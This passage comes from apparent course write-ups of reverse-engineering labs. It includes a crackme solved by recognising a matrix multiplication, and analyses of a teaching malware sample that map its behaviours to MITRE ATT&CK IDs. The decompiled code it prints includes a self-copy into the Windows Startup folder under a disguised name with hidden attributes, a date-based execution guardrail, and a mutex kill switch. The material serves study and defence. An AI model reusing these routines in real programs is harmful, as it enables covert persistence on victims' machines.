(int)len ); // 要輸入東西49次 } if ( length == sqrt_length_cp \u0026amp;\u0026amp; (space_1 = (struc_1 *)malloc(0x10uLL), space_1-\u0026gt;sqrt_len = sqrt_len, shuffle_space_1 = malloc(size), src = cipher_flag, space_1-\u0026gt;content_space = (__int64)shuffle_space_1, memcpy(shuffle_space_1, src, size), result = ugly_matrix_multiplication( (int *)space_1, (__int64)space), // guess_cipher的大小是196 // 他會把我們輸入的東西和他原本的東西一起送到guess_encrypt的這個function中 !memcmp((const void *)result[1], verify_key, size)) ) { puts(\u0026#34;Correct!\u0026#34;); } else { puts(\u0026#34;:(\u0026#34;); } return 0LL; } ::: :::spoiler IDA Ugly Function\n_QWORD *__fastcall guess_encrypt(int *space_1, __int64 space) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-\u0026#34;+\u0026#34; TO EXPAND] _RAX = malloc(0x10uLL); _RDI = *space_1; guess_cipher = _RAX; length_0x4 = *(int *)(space + 4); __asm { vmovd xmm5, edi } length_0x0 = *space_1; _RBX = 4 * length_0x4; __asm { vpinsrd xmm0, xmm5, r13d, 1 } length_0x4_cp = length_0x4; __asm { vmovq qword ptr [rax], xmm0 } space_2 = malloc(4 * length_0x4 * _RDI); guess_cipher[1] = space_2; if ( length_0x0 \u0026gt; 0 ) { length_0x4_cp2 = length_0x4; if ( (int)length_0x4 \u0026gt; 0 ) { length_0x0_2 = space_1[1]; length_0x0_cp = length_0x0; guess_cipher_1 = guess_cipher; length_16_0x4 = 16 * length_0x4; space_2_cp = space_2; length_0x0_2_minus_1 = length_0x0_2 - 1; space_1_cp = space_1; length_0x0_2_x_4 = 16LL * ((unsigned int)length_0x0_2 \u0026gt;\u0026gt; 2); v14 = 0; while ( 1 ) { v15 = 0LL; v16 = length_0x0_2 * v14; v87 = 4LL * length_0x0_2 * v14; cmd = length_0x4_cp \u0026amp; 7; if ( (length_0x4_cp \u0026amp; 7) == 0 ) goto LABEL_44; switch ( cmd ) { case 1LL: goto LABEL_42; case 2LL: goto LABEL_40; case 3LL: goto LABEL_38; case 4LL: goto LABEL_36; case 5LL: goto LABEL_34; } if ( cmd != 6 ) { if ( length_0x0_2 \u0026gt; 0 ) goto LABEL_12; v15 = 1LL; *space_2_cp = 0; } if ( length_0x0_2 \u0026lt;= 0 ) break; LABEL_12: v92 = v14; v18 = v15; v19 = *((_QWORD *)space_1_cp + 1); v20 = *(_QWORD *)(space + 8); if ( length_0x0_2_minus_1 \u0026lt;= 2 ) goto LABEL_26; while ( 1 ) { _R15 = v20 + 4 * v15; __asm { vpxor xmm0, xmm0, xmm0 } v23 = v19 + v87; v24 = length_0x0_2_x_4 + v19 + v87; v25 = ((unsigned __int8)((unsigned __int64)(length_0x0_2_x_4 - 16) \u0026gt;\u0026gt; 4) + 1) \u0026amp; 3; if ( (((unsigned __int8)((unsigned __int64)(length_0x0_2_x_4 - 16) \u0026gt;\u0026gt; 4) + 1) \u0026amp; 3) == 0 ) goto LABEL_51; if ( v25 != 1 ) { if ( v25 != 2 ) { __asm { vmovd xmm3, dword ptr [r15+rbx*2] vmovd xmm4, dword ptr [r15] } v23 += 16LL; __asm { vpinsrd xmm2, xmm3, dword ptr [r15+r8], 1 vpinsrd xmm1, xmm4, dword ptr [r15+rbx], 1 } _R15 += length_16_0x4; __asm { vpunpcklqdq xmm6, xmm1, xmm2 vpmulld xmm0, xmm6, xmmword ptr [rdx-10h] } } __asm { vmovd xmm7, dword ptr [r15+rbx*2] vmovd xmm9, dword ptr [r15] } v23 += 16LL; __asm { vpinsrd xmm8, xmm7, dword ptr [r15+r8], 1 vpinsrd xmm10, xmm9, dword ptr [r15+rbx], 1 } _R15 += length_16_0x4; __asm { vpunpcklqdq xmm11, xmm10, xmm8 vpmulld xmm12, xmm11, xmmword ptr [rdx-10h] vpaddd xmm0, xmm0, xmm12 } } __asm { vmovd xmm13, dword ptr [r15+rbx*2] vmovd xmm15, dword ptr [r15] } v23 += 16LL; __asm { vpinsrd xmm14, xmm13, dword ptr [r15+r8], 1 vpinsrd xmm5, xmm15, dword ptr [r15+rbx], 1 } _R15 += length_16_0x4; __asm { vpunpcklqdq xmm3, xmm5, xmm14 vpmulld xmm2, xmm3, xmmword ptr [rdx-10h] vpaddd xmm0, xmm0, xmm2 } if ( v24 != v23 ) { LABEL_51: do { __asm { vmovd xmm4, dword ptr [r15+rbx*2] vmovd xmm6, dword ptr [r15] } v23 += 64LL; __asm { vpinsrd xmm1, xmm4, dword ptr [r15+r8], 1 vpinsrd xmm7, xmm6, dword ptr [r15+rbx], 1 } _R15 = length_16_0x4 + _R15; __asm { vmovd xmm11, dword ptr [r15+rbx*2] vmovd xmm13, dword ptr [r15] vpinsrd xmm12, xmm11, dword ptr [r15+r8], 1 vpinsrd xmm14, xmm13, dword ptr [r15+rbx], 1 } _R15 = length_16_0x4 + _R15; __asm { vpunpcklqdq xmm8, xmm7, xmm1 vmovd xmm3, dword ptr [r15+rbx*2] vpmulld xmm9, xmm8, xmmword ptr [rdx-40h] vpinsrd xmm4, xmm3, dword ptr [r15+r8], 1 vpaddd xmm10, xmm0, xmm9 vmovd xmm2, dword ptr [r15] vpinsrd xmm1, xmm2, dword ptr [r15+rbx], 1 } _R15 = length_16_0x4 + _R15; __asm { vpunpcklqdq xmm15, xmm14, xmm12 vmovd xmm9, dword ptr [r15+rbx*2] vmovd xmm11, dword ptr [r15] vpmulld xmm5, xmm15, xmmword ptr [rdx-30h] vpinsrd xmm12, xmm11, dword ptr [r15+rbx], 1 vpaddd xmm0, xmm10, xmm5 vpunpcklqdq xmm6, xmm1, xmm4 vpmulld xmm7, xmm6, xmmword ptr [rdx-20h] vpinsrd xmm10, xmm9, dword ptr [r15+r8], 1 vpaddd xmm8, xmm0, xmm7 } _R15 = length_16_0x4 + _R15; __asm { vpunpcklqdq xmm13, xmm12, xmm10 vpmulld xmm14, xmm13, xmmword ptr [rdx-10h] vpaddd xmm0, xmm8, xmm14 } } while ( v24 != v23 ); } __asm { vpsrldq xmm15, xmm0, 8 vpaddd xmm5, xmm0, xmm15 vpsrldq xmm0, xmm5, 4 } v75 = length_0x0_2 \u0026amp; 0xFFFFFFFC; __asm { vpaddd xmm3, xmm5, xmm0 vmovd ecx, xmm3 } if ( length_0x0_2 != (length_0x0_2 \u0026amp; 0xFFFFFFFC) ) goto LABEL_21; LABEL_24: space_2_cp[v15++] = _ECX; if ( length_0x4_cp == v15 ) break; v18 = v15; if ( length_0x0_2_minus_1 \u0026lt;= 2 ) { LABEL_26: v75 = 0; _ECX = 0; LABEL_21: v78 = v75 + 1; _ECX += *(_DWORD *)(v20 + 4LL * (int)(v75 * length_0x4_cp2 + v18)) * *(_DWORD *)(v19 + 4LL * (int)(v16 + v75)); if ( (int)(v75 + 1) \u0026lt; length_0x0_2 ) { v79 = length_0x4_cp2 + v75 * length_0x4_cp2; v80 = v75 + 2; _ECX += *(_DWORD *)(v20 + 4LL * (v79 + v18)) * *(_DWORD *)(v19 + 4LL * (int)(v16 + v78)); if ( length_0x0_2 \u0026gt; v80 ) _ECX += *(_DWORD *)(v19 + 4LL * (v16 + v80)) * *(_DWORD *)(v20 + 4LL * (v18 + length_0x4_cp2 + v79)); } goto LABEL_24; } } v14 = v92; LABEL_28: space_2_cp = (_DWORD *)((char *)space_2_cp + _RBX); if ( length_0x0_cp == ++v14 ) return guess_cipher_1; } space_2_cp[v15++] = 0; LABEL_34: if ( length_0x0_2 \u0026gt; 0 ) goto LABEL_12; space_2_cp[v15++] = 0; LABEL_36: if ( length_0x0_2 \u0026gt; 0 ) goto LABEL_12; space_2_cp[v15++] = 0; LABEL_38: if ( length_0x0_2 \u0026gt; 0 ) goto LABEL_12; space_2_cp[v15++] = 0; LABEL_40: if ( length_0x0_2 \u0026gt; 0 ) goto LABEL_12; space_2_cp[v15++] = 0; LABEL_42: if ( length_0x0_2 \u0026gt; 0 ) goto LABEL_12; space_2_cp[v15++] = 0; if ( length_0x4_cp == v15 ) goto LABEL_28; LABEL_44: v82 = v15; while ( length_0x0_2 \u0026lt;= 0 ) { space_2_cp[v82] = 0; v83 = v82 + 1; space_2_cp[v83] = 0; space_2_cp[v83 + 1] = 0; space_2_cp[v83 + 2] = 0; space_2_cp[v83 + 3] = 0; space_2_cp[v83 + 4] = 0; space_2_cp[v83 + 5] = 0; space_2_cp[v83 + 6] = 0; v82 = v83 + 7; if ( length_0x4_cp == v82 ) goto LABEL_28; } v15 = v82; goto LABEL_12; } } return guess_cipher; } :::\nRecon # 一陣基本操作處理完比較好看的狀態後，首先發現一開始先輸入字串的長度(應該是49)，然後我們要輸入一些東西(就是按照前面輸入，總共也是49次)，接著就會進到很醜沒辦法解析的function(我暫時不理他)，一開始我在猜應該是做encryption之類的事情，接著就比對mem，一樣就噴correct這樣，我認為超級醜的function應該不是這次出題的重點，因為要全部逆完真的很有難度，對於學習也沒必要，此時我開始用動態+通靈的方式猜他在幹嘛，依照題目的標題和後面對比字串長度必須要等於7這兩個東西判斷，他應該是在做矩陣之類的操作，而那個醜不拉基的function應該是類似乘法或是加法之類的功能，有了想法就可以實驗他的操作 如果輸入長度49\n內容都是零，毫不意外經過醜不拉基function後都會是零 :::spoiler Result 0x000055aa2b46b4b0│+0x0000: 0x0000000000000000 ← $rdi 0x000055aa2b46b4b8│+0x0008: 0x0000000000000000 0x000055aa2b46b4c0│+0x0010: 0x0000000000000000 0x000055aa2b46b4c8│+0x0018: 0x0000000000000000 0x000055aa2b46b4d0│+0x0020: 0x0000000000000000 0x000055aa2b46b4d8│+0x0028: 0x0000000000000000 0x000055aa2b46b4e0│+0x0030: 0x0000000000000000 0x000055aa2b46b4e8│+0x0038: 0x0000000000000000 0x000055aa2b46b4f0│+0x0040: 0x0000000000000000 0x000055aa2b46b4f8│+0x0048: 0x0000000000000000 0x000055aa2b46b500│+0x0050: 0x0000000000000000 0x000055aa2b46b508│+0x0058: 0x0000000000000000 0x000055aa2b46b510│+0x0060: 0x0000000000000000 0x000055aa2b46b518│+0x0068: 0x0000000000000000 0x000055aa2b46b520│+0x0070: 0x0000000000000000 0x000055aa2b46b528│+0x0078: 0x0000000000000000 0x000055aa2b46b530│+0x0080: 0x0000000000000000 0x000055aa2b46b538│+0x0088: 0x0000000000000000 0x000055aa2b46b540│+0x0090: 0x0000000000000000 0x000055aa2b46b548│+0x0098: 0x0000000000000000 0x000055aa2b46b550│+0x00a0: 0x0000000000000000 0x000055aa2b46b558│+0x00a8: 0x0000000000000000 0x000055aa2b46b560│+0x00b0: 0x0000000000000000 0x000055aa2b46b568│+0x00b8: 0x0000000000000000 0x000055aa2b46b570│+0x00c0: 0x0000000000000000 ::: 內容都是一，經過醜不拉基function後都會每七個都是同一個數字 :::spoiler Result 0x000055d2f80754b0│+0x0000: 0x000003d4000003d4 ← $rdi 0x000055d2f80754b8│+0x0008: 0x000003d4000003d4 0x000055d2f80754c0│+0x0010: 0x000003d4000003d4 0x000055d2f80754c8│+0x0018: 0x000002d8000003d4 0x000055d2f80754d0│+0x0020: 0x000002d8000002d8 0x000055d2f80754d8│+0x0028: 0x000002d8000002d8 0x000055d2f80754e0│+0x0030: 0x000002d8000002d8 0x000055d2f80754e8│+0x0038: 0x0000030f0000030f 0x000055d2f80754f0│+0x0040: 0x0000030f0000030f 0x000055d2f80754f8│+0x0048: 0x0000030f0000030f 0x000055d2f8075500│+0x0050: 0x000003000000030f 0x000055d2f8075508│+0x0058: 0x0000030000000300 0x000055d2f8075510│+0x0060: 0x0000030000000300 0x000055d2f8075518│+0x0068: 0x0000030000000300 0x000055d2f8075520│+0x0070: 0x000003b0000003b0 0x000055d2f8075528│+0x0078: 0x000003b0000003b0 0x000055d2f8075530│+0x0080: 0x000003b0000003b0 0x000055d2f8075538│+0x0088: 0x000003c6000003b0 0x000055d2f8075540│+0x0090: 0x000003c6000003c6 0x000055d2f8075548│+0x0098: 0x000003c6000003c6 0x000055d2f8075550│+0x00a0: 0x000003c6000003c6 0x000055d2f8075558│+0x00a8: 0x0000031e0000031e 0x000055d2f8075560│+0x00b0: 0x0000031e0000031e 0x000055d2f8075568│+0x00b8: 0x0000031e0000031e 0x000055d2f8075570│+0x00c0: 0x000000000000031e ::: 內容都是二，和上面對比全部都會是兩倍 :::spoiler Result 0x0000563c09e664b0│+0x0000: 0x000007a8000007a8 ← $rdi 0x0000563c09e664b8│+0x0008: 0x000007a8000007a8 0x0000563c09e664c0│+0x0010: 0x000007a8000007a8 0x0000563c09e664c8│+0x0018: 0x000005b0000007a8 0x0000563c09e664d0│+0x0020: 0x000005b0000005b0 0x0000563c09e664d8│+0x0028: 0x000005b0000005b0 0x0000563c09e664e0│+0x0030: 0x000005b0000005b0 0x0000563c09e664e8│+0x0038: 0x0000061e0000061e 0x0000563c09e664f0│+0x0040: 0x0000061e0000061e 0x0000563c09e664f8│+0x0048: 0x0000061e0000061e 0x0000563c09e66500│+0x0050: 0x000006000000061e 0x0000563c09e66508│+0x0058: 0x0000060000000600 0x0000563c09e66510│+0x0060: 0x0000060000000600 0x0000563c09e66518│+0x0068: 0x0000060000000600 0x0000563c09e66520│+0x0070: 0x0000076000000760 0x0000563c09e66528│+0x0078: 0x0000076000000760 0x0000563c09e66530│+0x0080: 0x0000076000000760 0x0000563c09e66538│+0x0088: 0x0000078c00000760 0x0000563c09e66540│+0x0090: 0x0000078c0000078c 0x0000563c09e66548│+0x0098: 0x0000078c0000078c 0x0000563c09e66550│+0x00a0: 0x0000078c0000078c 0x0000563c09e66558│+0x00a8: 0x0000063c0000063c 0x0000563c09e66560│+0x00b0: 0x0000063c0000063c 0x0000563c09e66568│+0x00b8: 0x0000063c0000063c 0x0000563c09e66570│+0x00c0: 0x000000000000063c ::: 只有第一個element是1，其他都是零，由結果可知只有七個一數的第一個element會有值，且該值是已經從儲存在原本的執行檔中，比對之後發現一模一樣 :::spoiler Result 0x0000563dd53444b0│+0x0000: 0x000000000000003c (\u0026#34;\u0026lt;\u0026#34;?) ← $rdi 0x0000563dd53444b8│+0x0008: 0x0000000000000000 0x0000563dd53444c0│+0x0010: 0x0000000000000000 0x0000563dd53444c8│+0x0018: 0x0000007300000000 0x0000563dd53444d0│+0x0020: 0x0000000000000000 0x0000563dd53444d8│+0x0028: 0x0000000000000000 0x0000563dd53444e0│+0x0030: 0x0000000000000000 0x0000563dd53444e8│+0x0038: 0x000000000000007a (\u0026#34;z\u0026#34;?) 0x0000563dd53444f0│+0x0040: 0x0000000000000000 0x0000563dd53444f8│+0x0048: 0x0000000000000000 0x0000563dd5344500│+0x0050: 0x0000004100000000 0x0000563dd5344508│+0x0058: 0x0000000000000000 0x0000563dd5344510│+0x0060: 0x0000000000000000 0x0000563dd5344518│+0x0068: 0x0000000000000000 0x0000563dd5344520│+0x0070: 0x0000000000000067 (\u0026#34;g\u0026#34;?) 0x0000563dd5344528│+0x0078: 0x0000000000000000 0x0000563dd5344530│+0x0080: 0x0000000000000000 0x0000563dd5344538│+0x0088: 0x0000007900000000 0x0000563dd5344540│+0x0090: 0x0000000000000000 0x0000563dd5344548│+0x0098: 0x0000000000000000 0x0000563dd5344550│+0x00a0: 0x0000000000000000 0x0000563dd5344558│+0x00a8: 0x00000000000000fa 0x0000563dd5344560│+0x00b0: 0x0000000000000000 0x0000563dd5344568│+0x00b8: 0x0000000000000000 0x0000563dd5344570│+0x00c0: 0x0000000000000000 ::: 由以上實驗可以大致確認醜不拉基function做的事情就是矩陣乘法，而我們知道他比較的乘法結果，也知道和我們輸入的矩陣相乘的乘數，換言之可以反推回我們應該輸入的東西為何\nExploit # from pwn import * from sage.all import * r = process(\u0026#39;./simple-crackme_f5e33c76600e\u0026#39;) flag_len = 49 verify_matrix = Matrix([[0x00010ee0, 0x00010814, 0x00014d06, 0x00015a7c, 0x00012de1, 0x00014a5a, 0x0000f883], [0x0000df33, 0x0000a7a5, 0x0000e66b, 0x0000e0c8, 0x0000b727, 0x0000eb70, 0x00008d9e], [0x0000fe08, 0x0000d725, 0x00010163, 0x000101a0, 0x0000c427, 0x00010365, 0x0000afca], [0x0000db6f, 0x0000dbdf, 0x00010dc3, 0x0000fb36, 0x0000d5c3, 0x00011ae8, 0x0000ddc2], [0x00011589, 0x0000fbc8, 0x00014000, 0x00011f7f, 0x0001019d, 0x0001567c, 0x0000f435], [0x00012c8d, 0x0000ff0b, 0x00012caf, 0x00014592, 0x000112ff, 0x00015e64, 0x00010322], [0x000109f9, 0x0000f002, 0x000115ee, 0x0000fe74, 0x0000d58e, 0x00011306, 0x0000c506]]) ct = Matrix([[0x3C, 0xAD, 0xB9, 0xF5, 0x84, 0x25, 0x94], [0x73, 0xC8, 0x4E, 0x01, 0xAF, 0x04, 0x9B], [0x7A, 0xC8, 0x33, 0x6D, 0x0A, 0x7F, 0xA4], [0x41, 0x8E, 0x12, 0xE1, 0x94, 0x73, 0x37], [0x67, 0x82, 0x60, 0x7F, 0xE9, 0x91, 0x6E], [0x79, 0xBA, 0xEE, 0x09, 0xC1, 0xD0, 0x0B], [0xFA, 0xAD, 0x46, 0x64, 0x10, 0x59, 0x64]]) # flag = [102, 103, 112, 53, 70, 100, 72, 88, 47, 55, 122, 50, 69, 49, 66, 67, 74, 120, 118, 80, 68, 53, 99, 114, 102, 101, 100, 105, 57, 49, 89, 52, 68, 107, 71, 97, 83, 79, 68, 48, 113, 85, 79, 48, 86, 53, 48, 61, 0] flag = (verify_matrix.transpose() / ct.transpose()).transpose().coefficients() print(flag) r.sendline(str(flag_len).encode()) for i in range(len(flag)): r.sendline(str(flag[i]).encode()) r.sendline(b\u0026#39;0\u0026#39;) assert r.recvline().strip().decode() == \u0026#34;Correct!\u0026#34; r.close() print(\u0026#34;Password = \u0026#34; + \u0026#34;\u0026#34;.join([chr(i) for i in flag])) $ python exp.py [+] Starting local process \u0026#39;./simple-crackme_f5e33c76600e\u0026#39;: pid 12091 [102, 103, 112, 53, 70, 100, 72, 88, 47, 55, 122, 50, 69, 49, 66, 67, 74, 120, 118, 80, 68, 53, 99, 114, 102, 101, 100, 105, 57, 49, 89, 52, 68, 107, 71, 97, 83, 79, 68, 48, 113, 85, 79, 48, 86, 53, 48, 61] [*] Stopped process \u0026#39;./simple-crackme_f5e33c76600e\u0026#39; (pid 12091) Password = fgp5FdHX/7z2E1BCJxvPD5crfedi91Y4DkGaSOD0qUO0V50= 最後只要把解出來的東西丟回去revguard就可以拿到真正的flag了 Flag: FLAG{yOu_kn0w_hOw_to_r3v3r53_4_m47riX!}\n"},{"id":406,"href":"/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/","title":"Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)","section":"Securities","content":" Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80) # Description # 分析 eductf-lab.exe 中的 function sub_140001C80 在做什麼，並找出其行為所對應的 MITRE ATT\u0026amp;CK technique ID。 Flag format: FLAG{T1234.001}\nBackground # GetModuleFileNameA GetUserNameA CopyFileA SetFileAttributesA Source code # Main Function int __cdecl main(int argc, const char **argv, const char **envp) { Sleep(0x1B7740u); sub_140001C80(); sub_140001030(); sub_140001120(); sub_140001BF0(); return 0; } sub_140001C80 :::spoiler IDA Source Code DWORD sub_140001C80() { DWORD result; // eax size_t v1; // rax DWORD v2; // [rsp+20h] [rbp-258h] const CHAR *lpNewFileName; // [rsp+28h] [rbp-250h] DWORD pcbBuffer[4]; // [rsp+30h] [rbp-248h] BYREF CHAR Buffer[272]; // [rsp+40h] [rbp-238h] BYREF CHAR Filename[272]; // [rsp+150h] [rbp-128h] BYREF result = GetModuleFileNameA(0i64, Filename, 0x104u); v2 = result; if ( result ) { result = GetUserNameA(Buffer, pcbBuffer); if ( result ) { v1 = pcbBuffer[0] + v2 + 100; if ( __CFADD__(pcbBuffer[0], v2 + 100) ) v1 = -1i64; lpNewFileName = (const CHAR *)malloc(v1); sub_140001350( lpNewFileName, v2 + pcbBuffer[0] + 100, \u0026#34;C:\\\\Users\\\\%s\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\SecurityUpdateCheck.exe\u0026#34;, Buffer); result = CopyFileA(Filename, lpNewFileName, 0); if ( result ) return SetFileAttributesA(lpNewFileName, 0x26u); } } return result; } ::: Recon # :::spoiler IDA sub_14001C80(解析版)\nDWORD copyfile2startup_setAttribute() { DWORD Result; // eax size_t malloc_size; // rax DWORD filename_len; // [rsp+20h] [rbp-258h] const CHAR *file_new_path; // [rsp+28h] [rbp-250h] int username[4]; // [rsp+30h] [rbp-248h] BYREF CHAR username_buffer[272]; // [rsp+40h] [rbp-238h] BYREF CHAR Filename[272]; // [rsp+150h] [rbp-128h] BYREF Result = GetModuleFileNameA(0i64, Filename, 260u);// 取得目前執行程式的名稱 filename_len = Result; // 回傳值為名稱長度 if ( Result ) { Result = GetUserNameA(username_buffer, username);// 取得使用者名稱 if ( Result ) { malloc_size = username[0] + filename_len + 100; if ( __CFADD__(username[0], filename_len + 100) ) malloc_size = -1i64; file_new_path = malloc(malloc_size); sprintf( file_new_path, filename_len + username[0] + 100, \u0026#34;C:\\\\Users\\\\%s\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\SecurityUpdateCheck.exe\u0026#34;, username_buffer); Result = CopyFileA(Filename, file_new_path, 0); if ( Result ) return SetFileAttributesA(file_new_path, 0x26u); } } return Result; } ::: 從解析版中開始由上而下可以知道攻擊者的完整意圖\n取得目前執行程式的名稱和名稱長度 取得目前執行該程式的使用者名稱 利用(username_length + filename_length + 100)這個大小取得malloc的空間 利用sprintf，讓該空間儲存C:\\\\Users\\\\{username}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\SecurityUpdateCheck.exe這個字串 複製目前這個檔案到上一個file path 設定新檔案的屬性(備份檔+隱藏檔+系統檔) 根據以上的流程很明顯他要把檔案放到每次開機都一定會執行的資料夾，並且不想讓使用者察覺到該檔案，所有操作都是為了之後或下一次開機的時候仍然能夠持續執行該程式$\\to$Persistent\nExploit # 從ATT\u0026amp;CK的網站可以看到persistence的子頁面出現autostart其實和目前的狀態最吻合，就看他是用甚麼方法達到該目的，從其中的技巧來看會發現有很多種方法可以達到此效果，例如改變機碼或是改變lsass driver之類的，而我們的技巧被歸類在T1547.001 Att\u0026amp;CK - T1547 Flag: FLAG{T1547.001}\n"},{"id":407,"href":"/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/","title":"Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)","section":"Securities","content":" Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030) # Description # 分析 eductf-lab.exe 中的 function sub_140001030 在做什麼，並找出其行為所對應的 MITRE ATT\u0026amp;CK technique ID。 Flag format: FLAG{T1234}\nBackground # SystemTimeToFileTime CreateWaitableTimerW SetWaitableTimer WaitForSingleObject Source code # sub_140001030 :::spoiler IDA Source Code int waitUntil20231118() { HANDLE Result; // rax HANDLE hTimer; // [rsp+30h] [rbp-38h] SYSTEMTIME SystemTime; // [rsp+38h] [rbp-30h] BYREF struct _FILETIME FileTime; // [rsp+48h] [rbp-20h] BYREF LARGE_INTEGER DueTime; // [rsp+50h] [rbp-18h] BYREF SystemTime.wYear = 2023; SystemTime.wMonth = 11; SystemTime.wDay = 18; SystemTime.wDayOfWeek = 6; SystemTime.wHour = 0; SystemTime.wMinute = 0; SystemTime.wSecond = 0; SystemTime.wMilliseconds = 0; LODWORD(Result) = SystemTimeToFileTime(\u0026amp;SystemTime, \u0026amp;FileTime); if ( Result ) { DueTime = FileTime; Result = CreateWaitableTimerW(0i64, 0, 0i64); hTimer = Result; if ( Result ) { LODWORD(Result) = SetWaitableTimer(Result, \u0026amp;DueTime, 0, 0i64, 0i64, 0); if ( Result ) LODWORD(Result) = WaitForSingleObject(hTimer, 0xFFFFFFFF); } } return Result; } ::: Recon # 攻擊者的完整意圖\n設定一個時間(2023/11/18 0:0:0) 開啟一個waitable timer 設定waitable timer為一開始的截止時間 開始等待 根據以上的流程很明顯他是要一直等待直到11/18號那一天才會往下執行，這樣對修課生的壞處是沒辦法交作業，所以對我們來說是一大難處，他必須要符合時間等到11/18這個條件才會開始執行$\\to$Execution Guardrails\nExploit # 從Att\u0026amp;CK - Defense Evasion Execution Guardrails (T1480)可以看到\nAdversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.\n常見的條件有: 漏洞、系統語言、時間、Hostname\u0026hellip; Flag: FLAG{1480}\n"},{"id":408,"href":"/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/","title":"Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)","section":"Securities","content":" Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120) # Description # 分析 eductf-lab.exe 中的 function sub_140001120 在做什麼，並找出其所建立的 Mutex 的名稱。 Flag format: FLAG{mutex_name}\nBackground # CreateMutexA GetLastError 使用 Mutex 物件 可以使用 mutex 物件 來保護共用資源，避免多個執行緒或進程同時存取。 每個執行緒都必須等候 mutex 的擁有權，才能執行可存取共用資源的程式碼。 例如，如果數個執行緒共用資料庫的存取權，執行緒可以使用 mutex 物件一次只允許一個執行緒寫入資料庫。\n系統錯誤碼 (0-499) ERROR_ALREADY_EXISTS 183 (0xB7) 無法建立檔案，該檔案已存在。\nSource code # sub_140001120 :::spoiler IDA Source Code int sub_140001120() { HANDLE MutexA; // rax int i; // [rsp+20h] [rbp-78h] int v3[2]; // [rsp+30h] [rbp-68h] CHAR Name[32]; // [rsp+38h] [rbp-60h] BYREF char v5[32]; // [rsp+58h] [rbp-40h] BYREF v3[0] = 1684234874; qmemcpy(v5, \u0026amp;unk_140003348, 0x1Dui64); for ( i = 0; i \u0026lt; 28; ++i ) Name[i] = *(v3 + i % 4) ^ v5[i]; MutexA = CreateMutexA(0i64, 1, Name); if ( MutexA ) { LODWORD(MutexA) = GetLastError(); if ( MutexA == 183 ) exit(0); } return MutexA; } ::: Recon # 這一題有個小地方要注意，雖然觀察過source code是非常簡單的建立mutex的操作，題目想要知道的mutex name也非常簡單，只是個xor就知道的東西，不過在實作上需要注意endian的問題，一開始我是直接按照0x64, 0x63, 0x62, 0x7A的順序，但結果輸出一些ascii的字元，其實他是從後面讀進來再開始操作xor\nMalware使用Mutex的用途 與一般程式相同，用於跨 process / thread 間的 synchronization 避免重複感染、勒索 (LockBit 3.0、RedLine Stealer) Exploit # f = [0x0E, 0x0A, 0x52, 0x51, 0x25, 0x2B, 0x57, 0x3B, 0x4E, 0x3D, 0x0E, 0x11, 0x0E, 0x51, 0x1B, 0x3B, 0x11, 0x53, 0x2F, 0x28, 0x25, 0x31, 0x14, 0x0D, 0x0E, 0x01, 0x2B, 0x64] # v3 = [0x64, 0x63, 0x62, 0x7A] key = [0X7A, 0X62, 0X63, 0X64] Name = [] for i in range(len(f)): Name.append(chr(key[i % 4] ^ f[i])) print(\u0026#34;Flag: FLAG{\u0026#34; + \u0026#34;\u0026#34;.join(Name) + \u0026#34;}\u0026#34;) Flag: FLAG{th15_I4_4_mut3x_k1LL_SwitcH}\n"},{"id":409,"href":"/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/","title":"Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)","section":"Securities","content":" Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload) # Description # 取出 eductf-lab.exe 中的 next stage payload (embedded PE file)，並計算其 MD5 hash。 Flag format: FLAG{462fe0000\u0026hellip;} (hex character must be lowercase)\nBackground # DOS Header NT Headers - Optional Header Source code # sub_140001870 :::spoiler IDA Source Code解析前 __int64 __fastcall sub_140001870(char **pe_file, _QWORD *pe_file_size) { *pe_file = byte_140005040; *pe_file_size = 72770i64; // 這是個是怎麼判斷成PE size我也不知道 if ( **pe_file == \u0026#39;ZM\u0026#39; ) { if ( *(sub_1400013D0(*pe_file) + 0x18) == 0x20B ) { return 1i64; } else { sub_140001260(\u0026#34;remote dll optional header magic check failed\\n\u0026#34;); return 0i64; } } else { sub_140001260(\u0026#34;remote dll magic check failed\\n\u0026#34;); return 0i64; } } ::: Recon # 進到sub_140001BF0之後可以先觀察sub_140001870，前面有source code可以看到他正在比對byte_140005040的前面兩個字元是不是等於MZ，也就是一支PE file的magic header，並且又比對了後面0x18的位置是不是等於0x20B，也就是另外一個magic header(用來判斷該程式是否可於64-bits運行)，由以上操作幾乎可以確定駭客把真正的程式(可能是惡意的)塞在正常的PE file中 :::info 如果只是要解題的話，到這邊就可以了，只要利用前一題學到的把byte_140005040改變他的type，變成char[72770]，再用Shift+E，把raw data export出來，丟到online md5 checksum，就可以得到這支檔案的hash(462fe0007f86957f59824e113f78947c) ::: sub_1400013D0仔細看他的操作，其實就是把byte_140005040的地址，加上0x3C，再取值，就是e_lfanew，也就是NT Headers的file offset，這個offset加上原本的原本的140005040就是NT header，所以可以把sub_1400013D0 rename成getNtHdr __int64 __fastcall getNtHdr(__int64 a1) { return *(a1 + 0x3C) + a1; } 接下來可以改變這個function的type，按Y，改IMAGE_NT_HEADERS *__fastcall 